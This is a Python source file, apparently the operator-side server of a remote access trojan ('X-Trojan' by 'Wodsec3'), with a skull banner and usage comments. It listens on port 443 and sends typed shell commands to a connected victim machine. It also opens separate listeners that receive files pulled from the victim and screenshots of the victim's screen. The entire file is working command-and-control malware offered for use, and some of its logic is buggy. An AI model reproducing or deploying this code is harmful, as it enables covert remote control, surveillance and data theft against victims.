print('Attacker')
import random as r
import socket
import os
import time
from datetime import datetime

print('''
..................................::::::::::::::................................
.....................::!*%$$@&&###SSSSSSSSSSSSSS##&&@$%*!::.....................
................:*%@#S************************************S#&$*!................
.............!$#S***********************************************#@*.............
...........!&******************************************************#*...........
..........*S*********************************************************$..........
.........!************************************************************%.........
.........#*************************************************************:........
........***************************************************************@........
........&**************************************************************S:.......
.......:*********S&@@@@@&#S**************************#&@$%%%$@#**********.......
.......%******&%:.........::*$#******************#$*:..........:*&******@.......
.......&****&**@&#@***!!!:.....!@S*************@!.....:!*!***@#&$**&****#.......
.......S***$$S*****&$%*::!*%!....:@**********&!....:**!::!*$&*****S$@***S:......
......:****S***********S@*.:*%*....&********&....!%*:.!@S***********S****!......
......********************#*..*%*:!#********#!:%$*:.*&********************......
......**********************#%..*&************#%..*#**********************......
......%***********************#:.:$**********&:.*#***********************%......
......$********S#@$%%%%%$&S****#:..$*********:*#*****#@$%****%@&S********$......
......$******#*:..........:!$#**@...#********S****#$!...........:*&******@......
......@***S&%.................:@&...%***********&!.................*&#***&......
......@****.................::!&&...!***********&*::::::::::::!!!!!****%@%......
......@***!:!*%$$$@@&&&&&##SSS**&...!*************SSSSSS****************S@......
......&***#*********************@...!************************************@......
......%*************************%...*************************************@......
.......&************************!...*************************************$......
.......:#**********************#....*************************************!......
........:#*********************$....************************************$.......
.......%*:@*******************&:....%*********************************&*........
.......%**.!@S**********SS*S@*......$*********&%&*******************&*%:........
........&*!..:!**%%%**%%$&S!...*:...&*********S#$!S***S@@@&####&@$%!.%S:........
........:*S:.%!..$SSS*****#...$*%..:S************$%****#&@$$$!...*:.!*$.........
.........**#:!#!.:@********@:!**!..***************S*********S!..$*::#*:.........
..........$*#:*S!..*#*******SS***..%***********************@:..@*$.@*$..........
...........@*S!*#*...!$#*********%.%*******#&************#*..:&*@.$*#:..........
...........:&*S*!&%:....:*$&S**#$:..!%$@@$*..!#******S#$!...:#*%.%*S:...........
............:&**%.%&$:......:::.......:!.......*$$%*!:....:%S&!.$*S!............
.............:&**$.:@S&%!............%S*#*..............!$#S%..@*S!.............  
..............:&**&:.!@**S&$*!:....:@*****@:.......:!*@#**S&::&*S!..............  
...............:&**&:..!@*****SS##&@@$$%%%%**%$@@&#S********!S*#!...............
.................@**#:...!$#*****************************S!***&:................    
..................$**#:...@&@@&#SS**********************S!$**@:.................    
...................%**#:.:S***S#&@$***%%%%%$#**********#!&**$...................    
....................***#:.S********#!......*S*********&*#**%....................    
.....................!S*&.&*********@.....***********&%S*S*.....................    
......................:#*@**********%.....%**********#**#!......................          
.......................:$*S********@......:#***********&:.......................
.........................!S********:...!:..%**********$.........................  
..........................:&*******!...::..%********S*..........................  
............................$******$.......$*******&:...........................  
.............................*S****#:.....:S*****S%.............................  
..............................:$*****.....$****S$:..............................  
................................:%&#%.....&S#@*:................................  
..........................................::....................................  
''')

        #__  __   _____          _
        #\ \/ /  |_   _| __ ___ (_) __ _ _ __
        # \  /_____| || '__/ _ \| |/ _` | '_ \
       #  /  \_____| || | | (_) | | (_| | | | |
      #  /_/\_\    |_||_|  \___// |\__,_|_| |_|
                             #|__/
     #                From Wodsec3
    #https://www.github.com/wodsec3
    #COMMANDS:
      #  [1] download
     #   [2] screen
    #USAGE:
        #download <path>
        #download C:\users\root\desktop\hello.jpg
        #----------------------------------------
        #screen

    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
sep="<sep>"
host='0.0.0.0'
port=443
s=socket.socket(socket.AF_INET, socket.SOCK_STREAM)# TCP socket
s.bind((host, port))
s.listen(5)
print("Server is ON.. LISTENING At:%s"%(datetime.now()))

client, addr=s.accept()
print("Connected To %s:%i At : %s\n"%(addr[0],addr[1], datetime.now()))
cwd=client.recv(1024).decode()
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
while True:

    ### SHELL 
    cmd=input(f"{cwd}:$ ")  
    splited=cmd.split()
    if not cmd.strip():
        continue
    client.send(cmd.encode("utf-8"))
    if cmd.lower()=="exit":
        break
    if cmd.lower()=='cls'or"clear":
        try:
            os.system('cls')
        except:
            os.system('clear')
    output=client.recv(1024*128).decode()
    result, cwd=output.split(sep)
    print(result)
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    def download():

        try:
            os.system('cls')
        except:
            os.system('clear')
        print("Please Wait, File Downloading . . .")

        ip = "0.0.0.0"
        port = 5521

        sock = socket.socket(socket.AF_INET ,
                             socket.SOCK_STREAM) # New Socket For Dowbload Files


        sock.bind((ip , port))
        sock.listen()

        c, address = sock.accept()

        data = b""
        while True:
            tmp_data = c.recv(1024)
            if tmp_data == b"endendend":
                print("done")
                break
            data += tmp_data
        sock.close()
        filename = input("output name : ")
        file = open(filename , mode="wb")
        file.write(data)
        file.close()
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # #
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    def screen():
        try:
            os.system('cls')
        except:
            os.system('clear')
        print('*'*30)    
        print("[+]Screen Shot Taked . . .")
        ip = "0.0.0.0"
        port = 5858
        sc = socket.socket(socket.AF_INET ,
                     socket.SOCK_STREAM)
        sc.bind((ip , port))
        sc.listen()

        c, address = sc.accept()
           
        data = b""
        while True:
            tmp_data = c.recv(1024)
            if tmp_data == b"endendend":
                print("done")
                pass
            data += tmp_data
            break
        filename = str(r.randint(1,1000))+'.img'
        file = open(filename , mode="wb")
        file.write(data)
        file.close()
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # # 
    # # # # # # # # # # # # # # # # # # # # # # # # # # # # #             
    if splited[0]=="download":
        download()
        pass
    if splited[0]=="screen":
        screen()
        pass
        
    
        
            
